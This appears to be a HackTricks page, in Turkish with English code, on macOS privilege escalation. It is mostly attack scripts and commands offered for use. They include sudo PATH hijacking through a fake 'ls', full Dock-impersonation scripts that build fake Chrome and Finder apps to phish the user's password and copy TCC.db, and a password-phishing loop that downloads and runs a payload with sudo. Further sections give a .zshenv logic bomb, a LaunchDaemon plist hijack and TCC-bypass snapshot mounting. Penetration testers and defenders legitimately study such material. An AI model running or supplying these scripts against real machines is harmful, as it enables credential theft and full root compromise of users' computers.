# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation arıyorsanız şu bölüme gidin:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix'i etkileyen privilege escalation tekniklerinin çoğunun MacOS makinelerini de etkileyeceğini** lütfen unutmayın. Bu nedenle şuraya bakın:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Orijinal [Sudo Hijacking tekniğini Linux Privilege Escalation gönderisinin içinde](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) bulabilirsiniz.

Ancak macOS, kullanıcı **`sudo`** çalıştırdığında kullanıcının **`PATH`** değerini **korur**. Bu da bu saldırıyı gerçekleştirmenin başka bir yolunun, kurban **sudo çalıştırırken** çalıştırmaya devam edeceği **diğer binary'leri hijack etmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Terminal kullanan bir kullanıcının **Homebrew kurmuş olma ihtimalinin oldukça yüksek** olduğunu unutmayın. Bu nedenle **`/opt/homebrew/bin`** içindeki binary'leri hijack etmek mümkündür.

### Dock Impersonation

Bir miktar **social engineering** kullanarak Dock içinde örneğin **Google Chrome'u impersonate** edebilir ve aslında kendi script'inizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Bazı öneriler:

- Dock'ta Chrome olup olmadığını kontrol edin; varsa bu girdiyi **kaldırın** ve **fake** **Chrome girdisini Dock array'inde aynı konuma ekleyin**.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu nedenle onu Dock'a ekleyecekseniz sahte Finder'ı gerçek olanın hemen yanına yerleştirebilirsiniz. Bunun için **sahte Finder girdisini Dock dizisinin başına eklemeniz gerekir**.
- Başka bir seçenek, onu Dock'a yerleştirmemek ve yalnızca açmaktır; "Finder'ın Finder'ı denetlemek için izin istemesi" o kadar da garip değildir.
- Korkunç bir kutuyla parola sormadan **root yetkilerine yükseltmenin** başka bir yolu, Finder'ın ayrıcalıklı bir eylem gerçekleştirmek için gerçekten parola istemesini sağlamaktır:
- Finder'dan **`/etc/pam.d`** konumuna yeni bir **`sudo`** dosyası kopyalamasını isteyin (Parolayı isteyen istemde "Finder sudo'yu kopyalamak istiyor" ifadesi gösterilir)
- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol edebilirsiniz; böylece parolayı isteyen istemde "Finder Finder.bundle'u kopyalamak istiyor" ifadesi gösterilir)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware, **sudo-capable bir parolayı ele geçirmek** ve bunu programatik olarak yeniden kullanmak için kullanıcı etkileşimini sıklıkla kötüye kullanır. Yaygın akış:

1. `whoami` ile oturum açmış kullanıcıyı belirleyin.
2. `dscl . -authonly "$user" "$pw"` başarılı olana kadar **parola istemlerini döngüde tekrarlayın**.
3. Kimlik bilgisini (ör. `/tmp/.pass`) önbelleğe alın ve ayrıcalıklı işlemleri `sudo -S` (stdin üzerinden parola) ile yürütün.

Örnek minimal zincir:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Çalınan parola daha sonra **`xattr -c` ile Gatekeeper quarantine'ı kaldırmak**, LaunchDaemons veya diğer ayrıcalıklı dosyaları kopyalamak ve ek aşamaları etkileşimli olmayan şekilde çalıştırmak için yeniden kullanılabilir.

## Daha yeni macOS'e özgü vektörler (2023–2025)

### Kullanımdan kaldırılmış `AuthorizationExecuteWithPrivileges` hâlâ kullanılabilir

`AuthorizationExecuteWithPrivileges`, 10.7'de kullanımdan kaldırıldı ancak **Sonoma/Sequoia'da hâlâ çalışıyor**. Birçok ticari updater, güvenilmeyen bir path ile `/usr/libexec/security_authtrampoline` çağırıyor. Hedef binary kullanıcı tarafından yazılabiliyorsa bir trojan yerleştirip meşru prompt'tan yararlanabilirsiniz:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Yukarıdaki **masquerading tricks** ile birleştirerek inandırıcı bir password dialog sunun.


### Privileged helper / XPC triage

Birçok modern third-party macOS privesc aynı modeli izler: bir **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** içinden bir **Mach/XPC service** sunar; ardından helper ya **client'ı doğrulamaz**, doğrulamayı **çok geç** yapar (PID race) veya **user-controlled path/script** kullanan bir **root method** açığa çıkarır. Bu, VPN client'larındaki, game launcher'larındaki ve updater'lardaki birçok yeni helper bug'ının arkasındaki bug class'ıdır.

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Şu özelliklere sahip helper'lara özellikle dikkat edin:

- `launchd` içinde yüklü kalan job nedeniyle **uninstall işleminden sonra** da istekleri kabul etmeye devam edenler
- Script çalıştıran veya **`/Applications/...`** ya da root olmayan kullanıcılar tarafından yazılabilir diğer path'lerden configuration okuyanlar
- **PID tabanlı** veya yalnızca **bundle-id** kullanan ve race edilebilecek peer validation yöntemlerine dayananlar

Helper authorization bug'ları hakkında daha fazla bilgi için [bu sayfaya](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) bakın.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple bunu **Sonoma 14.5**, **Ventura 13.6.7** ve **Monterey 12.7.5** sürümlerinde düzeltene kadar, **`Installer.app`** / **`PackageKit.framework`** üzerinden kullanıcı tarafından başlatılan install işlemleri, **PKG script'lerini mevcut kullanıcının environment'ı içinde root olarak** çalıştırabiliyordu. Bu, **`#!/bin/zsh`** kullanan bir package'ın saldırganın **`~/.zshenv`** dosyasını yükleyip victim package'ı kurduğunda bunu **root olarak** çalıştırabileceği anlamına gelir.

Bu, özellikle bir **logic bomb** olarak ilgi çekicidir: Kullanıcının account'unda bir foothold'a ve yazılabilir bir shell startup file'a sahip olmanız yeterlidir; ardından kullanıcı tarafından çalıştırılacak herhangi bir vulnerable **zsh tabanlı** installer'ı beklersiniz. Bu durum genellikle **MDM/Munki** deployment'ları için geçerli değildir; çünkü bunlar root kullanıcının environment'ı içinde çalışır.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Daha derinlemesine installer-specific abuse incelemesi için [bu sayfaya](macos-files-folders-and-binaries/macos-installers-abuse.md) da göz atın.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Bir LaunchDaemon plist'i veya `ProgramArguments` hedefi **kullanıcı tarafından yazılabilir** durumdaysa, onu değiştirip ardından launchd'yi yeniden yüklemeye zorlayarak yetki yükseltebilirsiniz:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Bu, **CVE-2025-24085** için yayımlanan ve yazılabilir bir plist’in attacker code’u root olarak çalıştırmak amacıyla kötüye kullanıldığı exploit pattern’i yansıtır.

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` içindeki bir **race**, local attacker’ın thread’ler arasında `setgid()`/`getgid()` loop’larını, torn bir `memcpy` gerçekleşene kadar yarıştırarak read-only credential pointer’ını (`proc_ro.p_ucred`) bozmasına olanak tanır. Başarılı bir corruption, **uid 0** ve kernel memory access sağlar. Minimal PoC yapısı:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Heap grooming ile birleştirerek pointer'ın yeniden okunduğu konuma kontrollü veriler yerleştirin. Güvenlik açığı bulunan build'lerde bu, SIP bypass gerektirmeyen güvenilir bir **local kernel privesc** yöntemidir.

### Migration assistant üzerinden SIP bypass ("Migraine", CVE-2023-32369)

Zaten root yetkiniz varsa SIP hâlâ system konumlarına yazılmasını engeller. **Migraine** bug'ı, SIP bypass'ı miras alan bir child process başlatmak ve korunan path'lerin (ör. `/System/Library/LaunchDaemons`) üzerine yazmak için Migration Assistant entitlement'ı olan `com.apple.rootless.install.heritable` değerini kötüye kullanır. Zincir:

1. Çalışan bir sistemde root elde edin.
2. Saldırgan kontrollü bir binary çalıştırmak için `systemmigrationd`'yi hazırlanmış state ile tetikleyin.
3. SIP tarafından korunan dosyalara patch uygulamak ve reboot sonrasında da kalıcılığı sürdürmek için miras alınan entitlement'ı kullanın.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Birden fazla Apple daemon'ı XPC üzerinden **NSPredicate** nesnelerini kabul eder ve yalnızca saldırganın kontrol edebildiği `expressionType` alanını doğrular. Arbitrary selector'ları değerlendiren bir predicate oluşturarak **root/system XPC services içinde code execution** elde edebilirsiniz (ör. `coreduetd`, `contextstored`). Bu durum initial app sandbox escape ile birleştirildiğinde **user prompt olmadan privilege escalation** sağlar. Predicate'leri deserialize eden ve sağlam bir visitor içermeyen XPC endpoint'lerini arayın.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir user** (unprivileged user'lar dahil) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **tüm dosyalara erişebilir**.\
Gerekli **tek privileged** unsur, kullanılan application'ın (ör. `Terminal`) bir admin tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Hassas Bilgiler

Bu, ayrıcalıkları yükseltmek için yararlı olabilir:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referanslar

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Ayrıcalık Yükseltme](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: macOS için AWS Client VPN Yerel Ayrıcalık Yükseltme](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
